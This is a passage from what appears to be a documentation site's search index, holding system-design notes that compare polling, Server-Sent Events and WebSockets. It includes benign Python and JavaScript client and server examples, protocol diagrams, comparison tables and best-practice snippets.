ping\n</code></pre>"},{"location":"system-design/high-level/concepts/networking/#python-implementation_2","title":"Python Implementation","text":"<p>Server (Flask with streaming): <pre><code>from flask import Flask, Response, request\nimport json\nimport time\nimport threading\nfrom datetime import datetime\n\napp = Flask(__name__)\n\n# Store active connections\nactive_connections = []\nconnection_lock = threading.Lock()\n\ndef event_stream():\n    \"\"\"Generator function for SSE\"\"\"\n    # Create a queue for this client\n    from queue import Queue\n    message_queue = Queue()\n\n    # Register this connection\n    with connection_lock:\n        active_connections.append(message_queue)\n\n    try:\n        # Send initial connection event\n        yield f\"event: connected\\ndata: {json.dumps({'timestamp': datetime.now().isoformat()})}\\n\\n\"\n\n        # Send heartbeat and messages\n        while True:\n            try:\n                # Non-blocking get with timeout\n                message = message_queue.get(timeout=15)\n\n                # Format SSE event\n                event_data = f\"event: message\\n\"\n                event_data += f\"id: {int(time.time())}\\n\"\n                event_data += f\"data: {json.dumps(message)}\\n\\n\"\n\n                yield event_data\n\n            except:\n                # Send heartbeat on timeout\n                yield f\"event: heartbeat\\ndata: {json.dumps({'time': datetime.now().isoformat()})}\\n\\n\"\n\n    finally:\n        # Cleanup on disconnect\n        with connection_lock:\n            if message_queue in active_connections:\n                active_connections.remove(message_queue)\n\n@app.route('/stream')\ndef stream():\n    \"\"\"SSE endpoint\"\"\"\n    return Response(\n        event_stream(),\n        mimetype='text/event-stream',\n        headers={\n            'Cache-Control': 'no-cache',\n            'X-Accel-Buffering': 'no',  # Disable nginx buffering\n            'Connection': 'keep-alive'\n        }\n    )\n\n@app.route('/broadcast', methods=['POST'])\ndef broadcast():\n    \"\"\"Broadcast message to all connected clients\"\"\"\n    message = request.json\n\n    with connection_lock:\n        for queue in active_connections:\n            queue.put(message)\n\n    return json.dumps({\n        'status': 'sent',\n        'clients': len(active_connections)\n    }), 200\n\nif __name__ == '__main__':\n    app.run(port=5002, debug=True, threaded=True)\n</code></pre></p> <p>Client (Python): <pre><code>import requests\nimport json\n\nSERVER_URL = \"http://localhost:5002\"\n\ndef sse_client():\n    \"\"\"SSE client implementation\"\"\"\n    print(\"Connecting to SSE stream...\")\n\n    response = requests.get(\n        f\"{SERVER_URL}/stream\",\n        stream=True,\n        headers={'Accept': 'text/event-stream'}\n    )\n\n    if response.status_code == 200:\n        print(\"\u2705 Connected to SSE stream\")\n\n        # Read stream line by line\n        event_type = None\n        event_id = None\n        data_buffer = []\n\n        for line in response.iter_lines():\n            if line:\n                line = line.decode('utf-8')\n\n                if line.startswith('event:'):\n                    event_type = line.split(':', 1)[1].strip()\n                elif line.startswith('id:'):\n                    event_id = line.split(':', 1)[1].strip()\n                elif line.startswith('data:'):\n                    data = line.split(':', 1)[1].strip()\n                    data_buffer.append(data)\n                elif line.startswith('retry:'):\n                    retry = line.split(':', 1)[1].strip()\n            else:\n                # Empty line signals end of event\n                if data_buffer:\n                    full_data = '\\n'.join(data_buffer)\n\n                    try:\n                        parsed_data = json.loads(full_data)\n                        print(f\"\\n\ud83d\udcec Event: {event_type or 'message'}\")\n                        print(f\"   Data: {parsed_data}\")\n                    except:\n                        print(f\"\\n\ud83d\udcec Event: {event_type or 'message'}\")\n                        print(f\"   Data: {full_data}\")\n\n                    # Reset\n                    event_type = None\n                    event_id = None\n                    data_buffer = []\n    else:\n        print(f\"\u274c Failed to connect: {response.status_code}\")\n\nif __name__ == '__main__':\n    sse_client()\n</code></pre></p> <p>Client (JavaScript - Browser): <pre><code>// Browser implementation using EventSource API\nconst eventSource = new EventSource('http://localhost:5002/stream');\n\n// Listen for specific event types\neventSource.addEventListener('connected', (event) =&gt; {\n    console.log('\u2705 Connected:', JSON.parse(event.data));\n});\n\neventSource.addEventListener('message', (event) =&gt; {\n    console.log('\ud83d\udcec Message:', JSON.parse(event.data));\n});\n\neventSource.addEventListener('heartbeat', (event) =&gt; {\n    console.log('\ud83d\udc93 Heartbeat:', JSON.parse(event.data));\n});\n\n// Handle errors\neventSource.onerror = (error) =&gt; {\n    console.error('\u274c SSE Error:', error);\n    if (eventSource.readyState === EventSource.CLOSED) {\n        console.log('Connection closed');\n    }\n};\n\n// Close connection when done\n// eventSource.close();\n</code></pre></p>"},{"location":"system-design/high-level/concepts/networking/#advantages_2","title":"Advantages","text":"<ol> <li>\u2705 Real-time - Instant server-to-client push</li> <li>\u2705 Efficient - Single long-lived connection</li> <li>\u2705 Auto-reconnection - Browser handles reconnection automatically</li> <li>\u2705 Event IDs - Can resume from last received event</li> <li>\u2705 Simple protocol - Text-based, easy to debug</li> <li>\u2705 Native browser support - EventSource API built-in</li> <li>\u2705 Less overhead - No repeated HTTP headers</li> </ol>"},{"location":"system-design/high-level/concepts/networking/#disadvantages_2","title":"Disadvantages","text":"<ol> <li>\u274c Unidirectional - Only server \u2192 client (client uses HTTP for server)</li> <li>\u274c HTTP/1.1 limitation - Max 6 connections per domain in browsers</li> <li>\u274c Text only - Binary data needs encoding (Base64)</li> <li>\u274c No IE support - Internet Explorer doesn't support EventSource</li> <li>\u274c Proxy issues - Some proxies may buffer events</li> </ol>"},{"location":"system-design/high-level/concepts/networking/#4-websockets","title":"4. WebSockets","text":""},{"location":"system-design/high-level/concepts/networking/#description_3","title":"Description","text":"<p>Full-duplex bidirectional communication channel over a single TCP connection. Both client and server can send messages to each other at any time after the initial handshake.</p>"},{"location":"system-design/high-level/concepts/networking/#how-it-works_3","title":"How It Works","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                           \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Client  \u2502                                           \u2502 Server  \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518                                           \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518\n     \u2502                                                      \u2502\n     \u2502  HTTP Request (Upgrade: websocket)                  \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502\n     \u2502  GET /ws HTTP/1.1                                   \u2502\n     \u2502  Connection: Upgrade                                 \u2502\n     \u2502  Upgrade: websocket                                  \u2502\n     \u2502  Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==        \u2502\n     \u2502                                                      \u2502\n     \u2502  HTTP Response (101 Switching Protocols)            \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n     \u2502  HTTP/1.1 101 Switching Protocols                   \u2502\n     \u2502  Upgrade: websocket                                  \u2502\n     \u2502  Connection: Upgrade                                 \u2502\n     \u2502  Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk= \u2502\n     \u2502                                                      \u2502\n     \u2502\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2502\n     \u2502         \ud83d\udd0c WebSocket Connection Established         \u2502\n     \u2502              (Full-Duplex Channel)                   \u2502\n     \u2502\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2502\n     \u2502                                                      \u2502\n     \u2502  \u27a1\ufe0f  Message: \"Hello Server\"                       \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502\n     \u2502                                                      \u2502\n     \u2502  \u2b05\ufe0f  Message: \"Hello Client\"                       \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n     \u2502                                                      \u2502\n     \u2502  \u2b05\ufe0f  Message: \"Notification\"                       \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n     \u2502                                                      \u2502\n     \u2502  \u27a1\ufe0f  Message: \"Acknowledgment\"                     \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502\n     \u2502                                                      \u2502\n     \u2502  \u27a1\ufe0f  Message: \"User typing...\"                     \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502\n     \u2502                                                      \u2502\n     \u2502  \u2b05\ufe0f  Message: \"Broadcast: User X typing\"          \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n     \u2502                                                      \u2502\n     \u2502\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2502\n     \u2502     Both can send/receive simultaneously            \u2502\n     \u2502\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2502\n     \u2502                                                      \u2502\n     \u2502  Close Frame                                         \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502\n     \u2502                                                      \u2502\n     \u2502  Close Frame                                         \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n     \u2502                                                      \u2502\n     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/networking/#websocket-frame-structure","title":"WebSocket Frame Structure","text":"<pre><code> 0                   1                   2                   3\n 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-------+-+-------------+-------------------------------+\n|F|R|R|R| opcode|M| Payload len |    Extended payload length    |\n|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |\n|N|V|V|V|       |S|             |   (if payload len==126/127)   |\n| |1|2|3|       |K|             |                               |\n+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +\n|     Extended payload length continued, if payload len == 127  |\n+ - - - - - - - - - - - - - - - +-------------------------------+\n|                               |Masking-key, if MASK set to 1  |\n+-------------------------------+-------------------------------+\n| Masking-key (continued)       |          Payload Data         |\n+-------------------------------- - - - - - - - - - - - - - - - +\n:                     Payload Data continued ...                :\n+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +\n|                     Payload Data continued ...                |\n+---------------------------------------------------------------+\n\nFIN: 1 bit - Is this the final fragment?\nRSV1-3: 3 bits - Reserved for extensions\nOpcode: 4 bits - 0x0=continuation, 0x1=text, 0x2=binary, 0x8=close, 0x9=ping, 0xA=pong\nMASK: 1 bit - Is payload masked? (client\u2192server must be masked)\nPayload length: 7 bits, 7+16 bits, or 7+64 bits\n</code></pre>"},{"location":"system-design/high-level/concepts/networking/#python-implementation_3","title":"Python Implementation","text":"<p>Server (using <code>websockets</code> library): <pre><code>import asyncio\nimport websockets\nimport json\nfrom datetime import datetime\n\n# Store connected clients\nconnected_clients = set()\n\nasync def handler(websocket, path):\n    \"\"\"Handle WebSocket connections\"\"\"\n    print(f\"\u2705 Client connected: {websocket.remote_address}\")\n    connected_clients.add(websocket)\n\n    try:\n        # Send welcome message\n        await websocket.send(json.dumps({\n            'type': 'welcome',\n            'message': 'Connected to WebSocket server',\n            'timestamp': datetime.now().isoformat()\n        }))\n\n        # Listen for messages\n        async for message in websocket:\n            print(f\"\ud83d\udcec Received: {message}\")\n\n            try:\n                data = json.loads(message)\n\n                # Echo back to sender\n                response = {\n                    'type': 'echo',\n                    'original': data,\n                    'timestamp': datetime.now().isoformat()\n                }\n                await websocket.send(json.dumps(response))\n\n                # Broadcast to all other clients\n                if data.get('broadcast'):\n                    broadcast_msg = {\n                        'type': 'broadcast',\n                        'message': data.get('message'),\n                        'from': str(websocket.remote_address),\n                        'timestamp': datetime.now().isoformat()\n                    }\n\n                    # Send to all except sender\n                    for client in connected_clients:\n                        if client != websocket:\n                            await client.send(json.dumps(broadcast_msg))\n\n            except json.JSONDecodeError:\n                # Handle non-JSON messages\n                await websocket.send(f\"Received text: {message}\")\n\n    except websockets.exceptions.ConnectionClosed:\n        print(f\"\u274c Client disconnected: {websocket.remote_address}\")\n\n    finally:\n        connected_clients.remove(websocket)\n\nasync def main():\n    \"\"\"Start WebSocket server\"\"\"\n    async with websockets.serve(handler, \"localhost\", 8765):\n        print(\"\ud83d\ude80 WebSocket server started on ws://localhost:8765\")\n        await asyncio.Future()  # run forever\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n</code></pre></p> <p>Client (Python): <pre><code>import asyncio\nimport websockets\nimport json\n\nasync def client():\n    \"\"\"WebSocket client\"\"\"\n    uri = \"ws://localhost:8765\"\n\n    async with websockets.connect(uri) as websocket:\n        print(f\"\u2705 Connected to {uri}\")\n\n        # Receive welcome message\n        welcome = await websocket.recv()\n        print(f\"\ud83d\udcec Server: {welcome}\")\n\n        # Send messages\n        messages = [\n            {'message': 'Hello Server', 'broadcast': False},\n            {'message': 'This is a test', 'broadcast': True},\n            {'message': 'Broadcasting to all', 'broadcast': True}\n        ]\n\n        for msg in messages:\n            print(f\"\\n\u27a1\ufe0f  Sending: {msg}\")\n            await websocket.send(json.dumps(msg))\n\n            # Wait for response\n            response = await websocket.recv()\n            print(f\"\u2b05\ufe0f  Response: {response}\")\n\n            await asyncio.sleep(1)\n\n        print(\"\\n\ud83d\udc4b Closing connection\")\n\nif __name__ == \"__main__\":\n    asyncio.run(client())\n</code></pre></p> <p>Client (JavaScript - Browser): <pre><code>// Browser WebSocket implementation\nconst ws = new WebSocket('ws://localhost:8765');\n\n// Connection opened\nws.addEventListener('open', (event) =&gt; {\n    console.log('\u2705 Connected to WebSocket server');\n\n    // Send a message\n    ws.send(JSON.stringify({\n        message: 'Hello from browser!',\n        broadcast: true\n    }));\n});\n\n// Listen for messages\nws.addEventListener('message', (event) =&gt; {\n    console.log('\ud83d\udcec Message from server:', event.data);\n\n    try {\n        const data = JSON.parse(event.data);\n        console.log('Parsed:', data);\n    } catch (e) {\n        console.log('Text message:', event.data);\n    }\n});\n\n// Connection closed\nws.addEventListener('close', (event) =&gt; {\n    console.log('\u274c Disconnected from server');\n    console.log('Code:', event.code, 'Reason:', event.reason);\n});\n\n// Error occurred\nws.addEventListener('error', (error) =&gt; {\n    console.error('WebSocket error:', error);\n});\n\n// Send message function\nfunction sendMessage(message) {\n    if (ws.readyState === WebSocket.OPEN) {\n        ws.send(JSON.stringify(message));\n    } else {\n        console.error('WebSocket is not open');\n    }\n}\n\n// Close connection\nfunction closeConnection() {\n    ws.close(1000, 'Client closing connection');\n}\n</code></pre></p>"},{"location":"system-design/high-level/concepts/networking/#advantages_3","title":"Advantages","text":"<ol> <li>\u2705 Full-duplex - Bidirectional communication</li> <li>\u2705 Real-time - Extremely low latency</li> <li>\u2705 Efficient - Minimal overhead after handshake</li> <li>\u2705 Binary support - Can send binary data directly</li> <li>\u2705 Single connection - Reduces server load</li> <li>\u2705 Native browser support - WebSocket API built-in</li> <li>\u2705 Push from both sides - Both client and server can initiate</li> </ol>"},{"location":"system-design/high-level/concepts/networking/#disadvantages_3","title":"Disadvantages","text":"<ol> <li>\u274c Stateful - Connection state must be maintained</li> <li>\u274c Complex scaling - Sticky sessions or message broker needed</li> <li>\u274c Proxy issues - Some corporate proxies block WebSockets</li> <li>\u274c Load balancing complexity - Need WebSocket-aware load balancers</li> <li>\u274c No automatic reconnection - Must implement manually</li> <li>\u274c Firewall issues - May be blocked in restrictive networks</li> </ol>"},{"location":"system-design/high-level/concepts/networking/#comparison-table","title":"Comparison Table","text":"Feature Polling Long Polling Server-Sent Events WebSockets Direction Client \u2192 Server Client \u2192 Server Server \u2192 Client Bidirectional Connection New per request New per request Single long-lived Single long-lived Latency High (interval) Low Very Low Very Low Server Load Very High Medium Low Very Low Complexity Very Simple Medium Medium High Real-time \u274c No \u2705 Near \u2705 Yes \u2705 Yes Binary Data \u2705 Yes (encoded) \u2705 Yes (encoded) \u274c No (Base64) \u2705 Yes (native) Browser Support \u2705 Universal \u2705 Universal \u26a0\ufe0f No IE \u2705 Modern browsers Scalability Poor Medium Good Excellent Firewall Friendly \u2705 Yes \u2705 Yes \u2705 Yes \u26a0\ufe0f Sometimes blocked Auto Reconnect N/A N/A \u2705 Yes \u274c No (manual) HTTP Compatible \u2705 Yes \u2705 Yes \u2705 Yes \u274c Upgrades to WS Message Ordering Not guaranteed Not guaranteed \u2705 Guaranteed \u2705 Guaranteed"},{"location":"system-design/high-level/concepts/networking/#bandwidth-overhead-comparison","title":"Bandwidth &amp; Overhead Comparison","text":""},{"location":"system-design/high-level/concepts/networking/#example-sending-100-bytes-of-data","title":"Example: Sending 100 bytes of data","text":"<p>Short Polling (every 5 seconds): <pre><code>Request Headers:  ~800 bytes\nResponse Headers: ~500 bytes\nData:             100 bytes\nTotal per poll:   ~1,400 bytes\n\nPolls per minute: 12\nTotal per minute: ~16,800 bytes (16.4 KB)\nEfficiency:       ~0.7% (100/1400)\n</code></pre></p> <p>Long Polling: <pre><code>Request Headers:  ~800 bytes\nResponse Headers: ~500 bytes\nData:             100 bytes\nTotal per message: ~1,400 bytes\n\nMessages per minute: Variable (only when data available)\nIf 5 messages/min:   ~7,000 bytes (6.8 KB)\nEfficiency:          ~0.7% (100/1400)\n</code></pre></p> <p>Server-Sent Events: <pre><code>Initial Request:  ~800 bytes\nInitial Response: ~500 bytes\nPer Event:        ~50 bytes (event overhead) + 100 bytes = 150 bytes\n\nInitial:          ~1,300 bytes\n5 events:         ~750 bytes\nTotal:            ~2,050 bytes (2 KB)\nEfficiency:       ~24% (500/2050)\n</code></pre></p> <p>WebSockets: <pre><code>Initial Handshake: ~1,300 bytes (one-time)\nPer Message:       ~6 bytes (frame overhead) + 100 bytes = 106 bytes\n\nHandshake:        ~1,300 bytes\n5 messages:       ~530 bytes\nTotal:            ~1,830 bytes (1.8 KB)\nEfficiency:       ~27% (500/1830)\n</code></pre></p>"},{"location":"system-design/high-level/concepts/networking/#use-cases","title":"Use Cases","text":""},{"location":"system-design/high-level/concepts/networking/#short-polling","title":"Short Polling","text":"<ul> <li>Dashboard updates (not critical, every 30-60 seconds)</li> <li>Email checking (every few minutes)</li> <li>Weather updates (periodic data)</li> <li>Simple status checks</li> <li>Legacy system compatibility</li> </ul> <p>Example: Email client checking for new mail every 5 minutes</p>"},{"location":"system-design/high-level/concepts/networking/#long-polling","title":"Long Polling","text":"<ul> <li>Chat applications (before WebSockets)</li> <li>Notifications (when SSE not supported)</li> <li>Order status updates</li> <li>Job progress monitoring</li> <li>Fallback for SSE/WebSockets</li> </ul> <p>Example: Facebook notifications (used long polling before switching to other methods)</p>"},{"location":"system-design/high-level/concepts/networking/#server-sent-events","title":"Server-Sent Events","text":"<ul> <li>Live news feeds</li> <li>Stock price tickers</li> <li>Social media feeds</li> <li>Real-time notifications</li> <li>Server-side event broadcasts</li> <li>Live sports scores</li> <li>Monitoring dashboards</li> </ul> <p>Example: Twitter live feed, stock market tickers</p>"},{"location":"system-design/high-level/concepts/networking/#websockets","title":"WebSockets","text":"<ul> <li>Chat applications (Slack, Discord)</li> <li>Real-time gaming (multiplayer games)</li> <li>Collaborative editing (Google Docs)</li> <li>Live streaming (Twitch chat)</li> <li>Trading platforms</li> <li>IoT device communication</li> <li>Video conferencing (signaling)</li> </ul> <p>Example: WhatsApp Web, Discord chat, online multiplayer games</p>"},{"location":"system-design/high-level/concepts/networking/#decision-matrix","title":"Decision Matrix","text":"<pre><code>                    Short Polling  Long Polling    SSE      WebSockets\n                    \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\nUnidirectional         \u2705            \u2705            \u2705          \u2705\nBidirectional          \u274c            \u274c            \u274c          \u2705\nSimple implementation  \u2705            \u26a0\ufe0f            \u2705          \u274c\nLow latency           \u274c            \u26a0\ufe0f            \u2705          \u2705\nLow server load       \u274c            \u26a0\ufe0f            \u2705          \u2705\nMobile friendly       \u274c            \u26a0\ufe0f            \u2705          \u2705\nFirewall friendly     \u2705            \u2705            \u2705          \u26a0\ufe0f\nBinary data           \u26a0\ufe0f            \u26a0\ufe0f            \u274c          \u2705\nScales well           \u274c            \u26a0\ufe0f            \u2705          \u2705\n</code></pre>"},{"location":"system-design/high-level/concepts/networking/#when-to-use-what","title":"When to Use What?","text":""},{"location":"system-design/high-level/concepts/networking/#use-short-polling-when","title":"Use Short Polling When:","text":"<ul> <li>Updates are infrequent (&gt; 30 seconds)</li> <li>Real-time not critical</li> <li>Simplest implementation needed</li> <li>Working with very old systems</li> </ul>"},{"location":"system-design/high-level/concepts/networking/#use-long-polling-when","title":"Use Long Polling When:","text":"<ul> <li>Need better than short polling</li> <li>SSE/WebSockets not available</li> <li>Moderate real-time requirements</li> <li>Need to support all browsers/proxies</li> </ul>"},{"location":"system-design/high-level/concepts/networking/#use-server-sent-events-when","title":"Use Server-Sent Events When:","text":"<ul> <li>Only server \u2192 client push needed</li> <li>Client doesn't need to send much data</li> <li>Need automatic reconnection</li> <li>Broadcasting events to many clients</li> <li>Modern browser environment</li> </ul>"},{"location":"system-design/high-level/concepts/networking/#use-websockets-when","title":"Use WebSockets When:","text":"<ul> <li>Need bidirectional communication</li> <li>Real-time is critical (&lt; 100ms latency)</li> <li>High message frequency</li> <li>Binary data transfer needed</li> <li>Building chat, gaming, or collaborative apps</li> </ul>"},{"location":"system-design/high-level/concepts/networking/#evolution-timeline","title":"Evolution Timeline","text":"<pre><code>2000s: Short Polling\n  \u2514\u2500&gt; Simple HTTP requests\n  \u2514\u2500&gt; High overhead, poor for real-time\n\n2006: Comet / Long Polling\n  \u2514\u2500&gt; Improved latency\n  \u2514\u2500&gt; Still HTTP overhead\n\n2009: Server-Sent Events (HTML5)\n  \u2514\u2500&gt; EventSource API\n  \u2514\u2500&gt; One-way server push\n\n2011: WebSockets (RFC 6455)\n  \u2514\u2500&gt; Full-duplex communication\n  \u2514\u2500&gt; Minimal overhead\n  \u2514\u2500&gt; Industry standard for real-time\n\nFuture: HTTP/3 + QUIC\n  \u2514\u2500&gt; Improved performance\n  \u2514\u2500&gt; Better mobile support\n  \u2514\u2500&gt; Reduced latency\n</code></pre>"},{"location":"system-design/high-level/concepts/networking/#performance-comparison-real-world-scenario","title":"Performance Comparison (Real-World Scenario)","text":"<p>Scenario: 1000 users, 1 message per second per user</p> Method Connections Requests/sec Bandwidth/sec Server CPU Server RAM Short Polling (5s) 0 200 (1000\u00f75) ~280 KB High Low Long Polling 1000 1000 ~1.4 MB Very High High SSE 1000 1000 initial ~146 KB Medium Medium WebSockets 1000 1000 initial ~103 KB Low Medium <p>Winner: WebSockets for efficiency, SSE for simplicity with one-way communication</p>"},{"location":"system-design/high-level/concepts/networking/#best-practices","title":"Best Practices","text":""},{"location":"system-design/high-level/concepts/networking/#for-polling","title":"For Polling:","text":"<pre><code># Use exponential backoff on errors\ndef poll_with_backoff():\n    delay = 1\n    max_delay = 60\n\n    while True:\n        try:\n            response = requests.get(url)\n            delay = 1  # Reset on success\n            process(response)\n        except:\n            time.sleep(delay)\n            delay = min(delay * 2, max_delay)  # Exponential backoff\n</code></pre>"},{"location":"system-design/high-level/concepts/networking/#for-sse","title":"For SSE:","text":"<pre><code># Include heartbeats to detect dead connections\ndef sse_with_heartbeat():\n    while True:\n        if has_data():\n            yield f\"data: {get_data()}\\n\\n\"\n        else:\n            yield \":heartbeat\\n\\n\"  # Comment (ignored by client)\n        time.sleep(15)\n</code></pre>"},{"location":"system-design/high-level/concepts/networking/#for-websockets","title":"For WebSockets:","text":"<pre><code>// Implement reconnection logic\nclass WebSocketClient {\n    connect() {\n        this.ws = new WebSocket(this.url);\n\n        this.ws.onclose = () =&gt; {\n            console.log('Disconnected, reconnecting in 3s...');\n            setTimeout(() =&gt; this.connect(), 3000);\n        };\n    }\n}\n</code></pre>"},{"location":"system-design/high-level/concepts/networking/#summary","title":"Summary","text":"<ol> <li>Short Polling: Simplest but wasteful - use only for very infrequent updates</li> <li>Long Polling: Better than short polling - good fallback when SSE/WS unavailable</li> <li>Server-Sent Events: Efficient one-way push - perfect for feeds, notifications, dashboards</li> <li>WebSockets: Most powerful - ideal for chat, gaming, collaborative apps with bidirectional needs</li> </ol> <p>Modern Recommendation: - Primary: WebSockets for bidirectional, SSE for unidirectional - Fallback: Long polling for old browser/proxy support - Avoid: Short polling unless absolutely necessary</p>"},{"location":"system-design/high-level/concepts/passwords/","title":"Passwords and 